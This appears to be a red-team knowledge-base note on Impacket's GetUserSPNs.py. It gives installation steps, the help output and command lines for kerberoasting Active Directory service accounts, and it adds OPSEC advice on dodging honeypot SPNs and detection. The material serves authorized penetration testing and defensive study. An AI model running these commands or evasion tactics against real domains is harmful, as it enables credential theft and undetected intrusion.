---
aliases:
  - impacket-GetUserSPNs
tags:
  - ⚔️Tool
  - T1558003
primary-categories:
  - "[[Red Team]]"
  - "[[Penetration Test]]"
secondary-categories:
  - "[[Active Directory]]"
  - "[[Credential Harvesting]]"
  - "[[Post-Exploitation]]"
type: Tool
tool-category: Kerberoasting Utility
operating-platforms:
  - Linux
target-platforms:
  - Active Directory
implements-tradecraft:
  - "[[Kerberoasting]]"
used-in-playbooks:
  - <!-- [[Playbook Note]] -->
opsec-risk: Medium
detection-difficulty: Medium
tested: true
note-status: ☑️ Ready
---
# [[GetUserSPNs.py]]

---
## Overview

`GetUserSPNs.py`[^1] is a tool from the Impacket Python module collection that automates kerberoasting attacks against user accounts associated with service principal names (SPNs) in Active Directory (AD)[^2][^3]. If the service account password used to encrypt the returned ticket-granting service (TGS) ticket is sufficiently weak, an attacker can recover its plaintext password by cracking the TGS hash output from `GetUserSPNs.py`[^4].

## Requirements

* [ ] Attacker is on a \*nix-like machine with access to the target AD network
* [ ] Attacker has valid AD credentials
* [ ] Target user(s) are vulnerable to kerberoasting
	* [ ] Target user object(s) have a non-null  `servicePrincipalName` attribute

## Installation/Compilation

Before installing `GetUserSPNs.py`, ensure Python is installed:
```
# Debian/Ubuntu
sudo apt install python3

# Fedora
sudo dnf install python3
```

The easiest way to install `GetUserSPNs.py` is by installing the Impacket library via `pip`:
```
pip install impacket
```

Alternatively, clone the Impacket repository and install it locally:
```
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

On Kali Linux[^5], you can install the `impacket-scripts` package. This makes the tools accessible in your `$PATH`, prefixed with `impacket-`[^6]:
```
sudo apt install impacket-scripts

impacket-GetUserSPNs -h
```

## Usage

> [!tip]- Help Menu
> 
> ```
> Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
> 
> usage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN] [-no-preauth NO_PREAUTH] [-stealth] [-usersfile USERSFILE] [-request] [-request-user username] [-save] [-outputfile OUTPUTFILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
>                       [-aesKey hex key] [-dc-ip ip address] [-dc-host hostname]
>                       target
> 
> Queries target domain for SPNs that are running under a user account
> 
> positional arguments:
>   target                domain[/username[:password]]
> 
> options:
>   -h, --help            show this help message and exit
>   -target-domain TARGET_DOMAIN
>                         Domain to query/request if different than the domain of the user. Allows for Kerberoasting across trusts.
>   -no-preauth NO_PREAUTH
>                         account that does not require preauth, to obtain Service Ticket through the AS
>   -stealth              Removes the (servicePrincipalName=*) filter from the LDAP query for added stealth. May cause huge memory consumption / errors on large domains.
>   -usersfile USERSFILE  File with user per line to test
>   -request              Requests TGS for users and output them in JtR/hashcat format (default False)
>   -request-user username
>                         Requests TGS for the SPN associated to the user specified (just the username, no domain needed)
>   -save                 Saves TGS requested to disk. Format is <username>.ccache. Auto selects -request
>   -outputfile OUTPUTFILE
>                         Output filename to write ciphers in JtR/hashcat format. Auto selects -request
>   -ts                   Adds timestamp to every logging output.
>   -debug                Turn DEBUG output ON
> 
> authentication:
>   -hashes LMHASH:NTHASH
>                         NTLM hashes, format is LMHASH:NTHASH
>   -no-pass              don't ask for password (useful for -k)
>   -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
>   -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
> 
> connection:
>   -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter. Ignoredif -target-domain is specified.
>   -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
> ```
> 

Kerberoast all vulnerable users in a domain (you will be prompted for a password):
```
GetUserSPNs.py -request -dc-ip <dc-ipv4-address> <domain.full>/<user>
```

Kerberoast all vulnerable users and dump the output to a file:
```
GetUserSPNs.py -request -dc-ip <dc-ipv4-address> -outputfile <filename> <domain.full>/<user>
```

After retrieving a TGS ticket, you can attempt to crack the service account password using Hashcat or John the Ripper[^7][^8].

## Operational Security (OPSEC)

Requesting TGS tickets for every SPN in a domain will likely raise alerts, especially if one or more SPNs are positioned as honeypots, accounts intentionally configured to detect kerberoasting attempts[^9][^10]. These honeypot SPNs often appear legitimate but are closely monitored.

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
Password:
ServicePrincipalName          Name         MemberOf  PasswordLastSet            LastLogon  Delegation
----------------------------  -----------  --------  -------------------------  ---------  ---------
MSSQLSvc/sql.domain.com:1433  mssql_svc              XXXX-XX-XX XX:XX:XX.XXXXX  <never>
HoneySvc/fake.domain.com      honey_svc              XXXX-XX-XX XX:XX:XX.XXXXX  <never>
```

If possible, ensure the requesting account appears plausible to a defender. For example, a sales employee requesting a TGS for a Microsoft SQL Server service is suspicious; using an IT or data steward account would appear more legitimate[^11].

Additionally, avoid requesting all SPNs in bulk. Multiple SPN requests in a short window will appear as anomalous on a defender's radar, possibly leading to detection[^12]. Instead, identify individual accounts vulnerable to kerberoasting using BloodHound or a similar tool, then request TGS tickets for a single target[^13]:
```
GetUserSPNs.py -request-user <target-user> -dc-ip <dc-ipv4-address> -outputfile <filename> <domain.full>/<user>
```

> [!todo]
> Add discussion about encryption types, the `(servicePrincipalName=*)` LDAP query, and ticket request parameters.

## Under-the-Hood

> [!todo]
> Reverse engineer `GetUserSPNs.py` source code, analyze ticket exchanges in Wireshark, and document detailed function flow[^14].

---

## Related Notes

### Same Classification

#### Tools In Same Category
```dataview
LIST
FROM "03 - Content"
WHERE type = "Tool"
  AND (note-status = "☑️ Ready" OR note-status = "Ready" OR !note-status)
  AND file.name != this.file.name
  AND (
    tool-category = this.tool-category OR
    contains(operating-platforms, this.operating-platforms[0])
  )
SORT file.name ASC
LIMIT 10
```

### Typed Relationships

#### Implements Tradecraft
```dataview
LIST
FROM "03 - Content"
WHERE type = "Tradecraft"
  AND (note-status = "☑️ Ready" OR note-status = "Ready" OR !note-status)
  AND contains(this.implements-tradecraft, file.link)
SORT file.name ASC
```

#### Used In Playbooks
```dataview
LIST
FROM "03 - Content"
WHERE type = "Playbook"
  AND (note-status = "☑️ Ready" OR note-status = "Ready" OR !note-status)
  AND contains(this.used-in-playbooks, file.link)
SORT file.name ASC
```

### Reverse Relationships

#### Referenced By Other Notes
```dataview
LIST
FROM "03 - Content"
WHERE file.name != this.file.name
  AND (note-status = "☑️ Ready" OR note-status = "Ready" OR !note-status)
  AND (
    contains(required-tools, this.file.link) OR
    contains(uses-tools, this.file.link) OR
    contains(related-tools, this.file.link) OR
    contains(associated-tools, this.file.link)
  )
SORT file.name ASC
```

---

## Resources

| Reference                                                                                               | Info                                   |
| ------------------------------------------------------------------------------------------------------- | -------------------------------------- |
| [GetUserSPNs.py, Fortra](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)        | GitHub repository for `GetUserSPNs.py` |
| [Steal or Forge Kerberos Tickets: Kerberoasting, MITRE](https://attack.mitre.org/techniques/T1558/003/) | MITRE ATT&CK entry for "Kerberoasting" |

[^1]: GetUserSPNs.py, Fortra, https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
[^2]: Attacking Microsoft Kerberos Kicking the Guard Dog of Hades, Tim Medin, https://youtu.be/PUyhlN-E5MU
[^3]: Kerberoasting Revisited, Will Schroeder, https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
[^4]: Ticket-Granting Service, NIST, https://csrc.nist.gov/glossary/term/tgs
[^5]: Kali Linux, Offsec, https://www.kali.org/
[^6]: impacket-scripts, Kali Linux, https://www.kali.org/tools/impacket-scripts/
[^7]: Hashcat, Hashcat, https://hashcat.net/hashcat/
[^8]: John the Ripper, Openwall, https://www.openwall.com/john/
[^9]: Detecting Kerberoasting Activity Part 2 – Creating a Kerberoast Service Account Honeypot, Sean Metcalf, https://adsecurity.org/?p=3513
[^10]: Honeypot, NIST, https://csrc.nist.gov/glossary/term/honeypot
[^11]: Microsoft SQL Server, Microsoft, https://www.microsoft.com/en-us/sql-server
[^12]: Windows Event ID 4769 Kerberos Service Ticket Request, Splunk, https://research.splunk.com/endpoint/eb3e6702-8936-11ec-98fe-acde48001122/
[^13]: BloodHound, SpecterOps, https://github.com/SpecterOps/BloodHound
[^14]: Wireshark, Wireshark Foundation, https://www.wireshark.org/

---

*Created Date*: <%+tp.file.creation_date("MMMM Do YYYY (HH:mm a)")%>  
*Last Modified Date*: <%+tp.file.last_modified_date("MMMM Do YYYY (HH:mm a)")%>
